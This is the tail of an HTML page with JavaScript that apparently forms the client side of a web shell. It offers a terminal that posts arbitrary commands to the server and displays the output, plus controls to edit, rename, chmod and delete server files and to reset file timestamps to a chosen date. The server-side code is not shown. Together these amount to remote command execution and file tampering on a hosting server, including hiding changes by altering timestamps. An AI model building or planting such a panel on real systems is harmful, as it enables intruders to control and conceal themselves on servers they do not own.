<div id="copy-toast" style="display:none;position:fixed;bottom:24px;right:24px;background:var(--bg2);border:1px solid var(--green3);color:var(--green);padding:12px 22px;font-size:15px;border-radius:2px;z-index:9999;box-shadow:0 0 20px rgba(0,255,65,.3);letter-spacing:1px">
  PATH COPIED
</div>

<script>
// Terminal
const termOut = document.getElementById('term-out');
const termInput = document.getElementById('term-input');
const cmdHistory = [];
let histIdx = -1;

termInput.addEventListener('keydown', function(e) {
  if (e.key === 'Enter') { runCmd(); return; }
  if (e.key === 'ArrowUp') { if (histIdx < cmdHistory.length-1) { histIdx++; termInput.value = cmdHistory[cmdHistory.length-1-histIdx]; } e.preventDefault(); }
  if (e.key === 'ArrowDown') { if (histIdx > 0) { histIdx--; termInput.value = cmdHistory[cmdHistory.length-1-histIdx]; } else { histIdx=-1; termInput.value=''; } e.preventDefault(); }
});

function runCmd() {
  const cmd = termInput.value.trim();
  if (!cmd) return;
  cmdHistory.push(cmd); histIdx = -1;
  termOut.innerHTML += '\n<span style="color:var(--cyan)">$ ' + escHtml(cmd) + '</span>\n';
  termInput.value = '';
  const fd = new FormData(); fd.append('cmd', cmd);
  fetch(location.href, {method:'POST', body:fd})
    .then(r => r.text())
    .then(t => { termOut.innerHTML += escHtml(t||'(no output)')+'\n'; termOut.scrollTop = termOut.scrollHeight; })
    .catch(e => { termOut.innerHTML += '<span style="color:var(--red)">[ERR] '+escHtml(e.message)+'</span>\n'; });
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// Panels
function togglePanel(id) {
  const el = document.getElementById(id);
  el.classList.toggle('open');
}

// Modals
function openModal(id) { document.getElementById(id).classList.add('open'); }
function closeModal(id) { document.getElementById(id).classList.remove('open'); }
document.querySelectorAll('.modal').forEach(m => {
  m.addEventListener('click', function(e) { if (e.target===this) closeModal(this.id); });
});

// Edit
function doEdit(fp) {
  document.getElementById('edit-path').value = fp;
  document.getElementById('edit-filename').textContent = fp.split('/').pop();
  document.getElementById('edit-content').value = 'Loading...';
  openModal('modal-edit');
  fetch('?editload='+encodeURIComponent(fp))
    .then(r => r.text())
    .then(t => { document.getElementById('edit-content').value = t; });
}

// Rename
function doRename(fp, name) {
  document.getElementById('rename-from').value = fp;
  document.getElementById('rename-to').value = name;
  openModal('modal-rename');
}

// Chmod
function doChmod(fp, oct) {
  document.getElementById('chmod-path').value = fp;
  document.getElementById('chmod-val').value = oct;
  openModal('modal-chmod');
}

// Touch
function doTouch(fp) {
  document.getElementById('touch-path').value = fp;
  document.getElementById('touch-date').value = new Date().toISOString().slice(0,16);
  openModal('modal-touch');
}

// Delete
function doDelete(fp) {
  if (!confirm('DELETE: ' + fp + '\n\nConfirm?')) return;
  const fd = new FormData(); fd.append('delete', fp);
  fetch(location.href, {method:'POST', body:fd})
    .then(() => location.reload());
}

// Copy path
function copyPath(fp) {
  navigator.clipboard.writeText(fp).then(() => {
    const t = document.getElementById('copy-toast');
    t.style.display = 'block';
    setTimeout(() => { t.style.display='none'; }, 1500);
  });
}

// ESC to close modals
document.addEventListener('keydown', e => {
  if (e.key==='Escape') document.querySelectorAll('.modal.open').forEach(m => m.classList.remove('open'));
});
</script>
</body>
</html>
